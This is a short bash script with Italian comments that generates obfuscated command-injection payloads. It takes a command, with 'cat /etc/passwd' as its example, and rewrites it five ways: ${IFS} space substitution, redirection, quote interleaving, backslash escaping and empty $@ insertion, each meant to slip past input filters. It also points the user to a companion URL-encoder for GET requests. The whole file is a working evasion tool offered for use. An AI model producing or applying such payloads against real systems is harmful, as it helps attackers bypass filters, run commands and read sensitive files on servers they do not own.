#!/bin/bash
# cmd_obfuscator.sh - Generatore di payload offuscati

if [ -z "$1" ]; then
    echo "Uso: $0 \"comando da offuscare\""
    echo "Es: $0 \"cat /etc/passwd\""
    exit 1
fi

CMD="$1"

echo -e "\n🔥 PAYLOAD OFFUSCATI PER COMMAND INJECTION 🔥\n"

# 1. Spazi con ${IFS}
IFS_CMD=$(echo "$CMD" | sed 's/ /${IFS}/g')
echo -e "[1] Bypass Spazi (\${IFS}):\n$IFS_CMD\n"

# 2. Spazi con input redirect (funziona bene se è un comando a 2 parole es. "cat /etc/passwd")
if [[ $(echo "$CMD" | wc -w) -eq 2 ]]; then
    REDIR_CMD=$(echo "$CMD" | sed 's/ /</')
    echo -e "[2] Bypass Spazi (Ridirezione <):\n$REDIR_CMD\n"
fi

# 3. Offuscamento base con apici singoli (intervalla le lettere)
QUOTE_CMD=$(echo "$CMD" | sed "s/\([a-zA-Z]\)\([a-zA-Z]\)/\1'\2'/g")
echo -e "[3] Bypass Filtri Testuali (Apici Singoli):\n$QUOTE_CMD\n"

# 4. Offuscamento con backslash (escapa quasi tutte le lettere)
SLASH_CMD=$(echo "$CMD" | sed 's/\([a-zA-Z]\)/\\\1/g')
echo -e "[4] Bypass Filtri Testuali (Backslash):\n$SLASH_CMD\n"

# 5. Variabile vuota $@ in mezzo alle parole
AT_CMD=$(echo "$CMD" | sed 's/\([a-zA-Z]\)\([a-zA-Z]\)/\1$@\2/g')
echo -e "[5] Bypass Filtri Testuali (Variabile vuota \$@):\n$AT_CMD\n"

echo "💡 Suggerimento: Se passi il payload via GET, passalo al web_encoder.sh per fare l'URL Encode!"
echo ""